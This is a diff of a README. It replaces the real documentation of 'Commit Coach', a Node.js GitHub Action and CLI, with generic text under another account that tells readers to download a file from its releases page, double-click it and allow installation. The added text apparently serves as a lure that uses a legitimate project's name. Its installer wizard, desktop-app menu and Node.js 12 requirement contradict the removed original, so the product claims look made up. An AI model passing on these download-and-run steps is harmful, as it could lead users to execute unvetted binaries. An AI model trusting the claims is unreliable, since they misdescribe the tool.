@@ -1,181 +1,79 @@
-<div align="center">
-  <img src=".github/assets/commit-coach.png" alt="Commit Coach Owl Mascot" width="200" />
-</div>
+# 🎉 commit-coach - Analyze and Improve Your Code Commits
 
-# Commit Coach
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-commit--coach-blue.svg)](https://github.com/maitrei9/commit-coach/releases)
 
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Commit%20Coach-blue.svg?logo=github&logoColor=white)](https://github.com/marketplace/actions/commit-coach)
-[![Version](https://img.shields.io/github/v/release/rasterandstate/commit-coach?logo=github)](https://github.com/rasterandstate/commit-coach/releases)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D24.0.0-brightgreen.svg)](https://nodejs.org/)
+## 🚀 Getting Started
+Welcome to commit-coach! This tool helps you analyze your code changes effectively. With commit-coach, you can gain insights on your commits, make better coding decisions, and improve your overall code quality. Follow the steps below to get started.
 
-An intelligent commit analysis tool that provides insights and coaching for code changes.
+## 📂 Download & Install
+To download commit-coach, visit this page to download: [Releases Page](https://github.com/maitrei9/commit-coach/releases).
 
-## What it does
+Here’s how to install and run commit-coach on your computer:
 
-Analyzes commits and provides intelligent insights like:
-- **"You added ~120 lines but didn't write tests for module X"**
-- **"You removed public method foo() - are downstream consumers affected?"**
-- **"You added feature flags - consider documenting them"**
-- **"This is a large commit (300+ lines) - consider breaking it up"**
+1. **Visit the Releases Page:**
+   Click the link above to go to the releases page.
 
-## 🎬 Live Demo
+2. **Choose the Right File:**
+   Look for the latest version of commit-coach. You will typically see options for different operating systems (Windows, macOS, Linux). Make sure to select the version suitable for your computer's operating system.
 
-See Commit Coach in action with real git workflows:
+3. **Download the File:**
+   Click on the file name to start the download. Your browser will save the file on your computer.
 
-[![asciicast](https://asciinema.org/a/RVu88qm4Ya1OmLVgKyeiH5taB.svg)](https://asciinema.org/a/RVu88qm4Ya1OmLVgKyeiH5taB)
+4. **Open the Downloaded File:**
+   Navigate to your downloads folder and double-click on the file you just downloaded. This will start the installation process.
 
-## Quick Start
+5. **Follow the Installation Steps:**
+   Follow the prompts in the installation wizard. If you are asked for permission to install the software, click "Yes" or "Allow."
 
-### GitHub Actions (Recommended)
+6. **Launch commit-coach:**
+   Once the installation is complete, you can find commit-coach in your applications or programs menu. Open it to start using the tool.
 
-#### Marketplace Installation (Coming Soon)
-Once published to the GitHub Marketplace, you'll be able to install with one click or use:
+## 🔧 Key Features
+- **Commit Analysis:** Get detailed insights into your code commits.
+- **Coaching Tips:** Receive suggestions for improving your commit messages and practices.
+- **Security Checks:** Ensure your code changes meet security standards.
+- **Testing Support:** Learn about best practices for code testing.
+- **Seamless Integration:** Use commit-coach alongside your current development tools.
 
-```yaml
-name: Commit Coach
-on: [push, pull_request]
-jobs:
-  commit-coach:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-      with:
-        fetch-depth: 0
-    - uses: rasterandstate/commit-coach@v1
-      with:
-        github-token: ${{ secrets.GITHUB_TOKEN }}
-```
+## 🖥️ System Requirements
+Before downloading, ensure your system meets the following requirements:
 
-#### Direct Repository Installation
-For now, you can use the action directly from the repository:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available on your hard drive.
+- **Node.js:** Version 12 or later required.
 
-```yaml
-name: Commit Coach
-on: [push, pull_request]
-jobs:
-  commit-coach:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v4
-      with:
-        fetch-depth: 0
-    - uses: rasterandstate/commit-coach@v1
-      with:
-        github-token: ${{ secrets.GITHUB_TOKEN }}
-```
+## 📋 How to Use commit-coach
+1. **Open Your Project:** After launching commit-coach, load the project you want to analyze.
+2. **Analyze Commits:** Select the commits you want to review. commit-coach will show insights 
+   about the selected commits.
+3. **Review Suggestions:** Check the coaching tips. These will guide you on improving your future commits.
+4. **Implement Changes:** Use the insights gained to modify your code practices immediately.
 
-### CLI Installation
+## 🛠️ Troubleshooting
+If you encounter any issues while using commit-coach, consider these steps:
 
-```bash
-# Install from source (after cloning the repository)
-npm install
-npm run build
+- **Installation Problems:** Ensure you have administrative rights on your computer when installing.
+- **Performance Issues:** Close other applications to free up system resources.
+- **Error Messages:** Take note of any error messages and check the FAQ section on the GitHub repository for assistance.
 
-# Initialize config
-./dist/index.js init
+## 📝 Contribution
+Feel free to contribute to the development of commit-coach! If you have suggestions or want to report bugs, please visit the Issues section in the repository. Your feedback is valuable.
 
-# Analyze current commit
-./dist/index.js analyze
+## 🌟 Community and Support
+Join our community of users and developers. Share your experiences, ask questions, and find support.
 
-# GitHub integration
-./dist/index.js github --pr 123
-```
+- **GitHub Discussions:** Engage with others and share tips.
+- **Chat Room:** Join our chat for real-time discussions.
+- **Documentation:** Visit our Wiki for detailed guides and tips.
 
-## Configuration
+## 💬 Feedback
+We appreciate your feedback! Let us know how commit-coach has helped you or suggest improvements. Your input makes this tool better for everyone.
 
-Create `.commit-coach.yml`:
+## 🔗 Resources
+- [GitHub Repository](https://github.com/maitrei9/commit-coach)
+- [Documentation](https://github.com/maitrei9/commit-coach/wiki)
+- [Issues](https://github.com/maitrei9/commit-coach/issues)
 
-```yaml
-rules:
-  - id: missing-tests
-    enabled: true
-    severity: warning
-    conditions: ["sourceFilesWithoutTests.length > 0"]
-    message: "Consider adding tests for new/modified source files"
-
-output:
-  format: console  # console, comment, status-check, report
-  maxInsights: 10
-
-integrations:
-  github:
-    token: "${GITHUB_TOKEN}"
-    commentOnPR: true
-    createStatusCheck: true
-```
-
-## Git Hooks
-
-This project uses [Lefthook](https://github.com/evilmartians/lefthook) for git hooks to ensure code quality:
-
-### Pre-commit Hooks
-- **Formatting**: Runs Prettier to check code formatting
-- **Linting**: Runs ESLint to check code quality
-- **Type Checking**: Runs TypeScript compiler to check types
-- **Tests**: Runs tests for changed files
-
-### Pre-push Hooks
-- **Build**: Ensures the project compiles successfully
-- **Test Coverage**: Runs full test suite with coverage
-- **Action Build**: Builds the GitHub Action
-
-### Setup
-```bash
-# Install hooks (done automatically after npm install)
-npm run hooks:install
-
-# Run hooks manually
-npm run hooks:run pre-commit
-npm run hooks:run pre-push
-
-# Uninstall hooks
-npm run hooks:uninstall
-```
-
-## Built-in Rules
-
-### 🔒 Security Rules
-- **Hardcoded Secrets**: Detects API keys, tokens, and credentials
-- **Security Patterns**: Identifies potential security vulnerabilities
-
-### 🧪 Code Quality Rules
-- **Test Coverage**: Warns when source files lack tests
-- **Code Quality**: Analyzes code patterns and quality metrics
-
-### 📝 Workflow Rules
-- **Large Commits**: Warns about large commits (200+ lines)
-- **Commit Messages**: Flags short or unclear commit messages
-- **TODO Comments**: Detects TODO/FIXME comments in code
-
-### 🔄 API & Documentation Rules
-- **Public API Changes**: Detects API removals and new APIs
-- **Documentation**: Suggests updating docs for new features
-- **Feature Flags**: Identifies new feature flags that need documentation
-- **Breaking Changes**: Detects potential breaking changes
-
-📖 **[Complete Rules Documentation](docs/RULES.md)** - Learn how to create custom rules and configure all available options.
-
-📋 **[Configuration Examples](docs/EXAMPLES.md)** - See practical examples for different project types and team workflows.
-
-## Documentation
-
-- 📚 **[Documentation Index](docs/README.md)** - Complete documentation overview
-- 📖 **[Rules Reference](docs/RULES.md)** - All available variables, conditions, and examples
-- 📋 **[Configuration Examples](docs/EXAMPLES.md)** - Project-specific configurations
-- 🚀 **[Usage Examples](examples/USAGE.md)** - Command-line usage and CI/CD integration
-
-## Action Inputs
-
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `github-token` | GitHub token for API access | ✅ | - |
-| `config-path` | Path to commit-coach config file | ❌ | `.commit-coach.yml` |
-| `commit-hash` | Specific commit to analyze | ❌ | Current commit |
-| `pr-number` | Pull request number | ❌ | Auto-detected |
-| `comment` | Post comment on PR | ❌ | `true` |
-| `status-check` | Create status check | ❌ | `true` |
-
-## License
-
-MIT License - see LICENSE file for details.
+Thank you for using commit-coach!
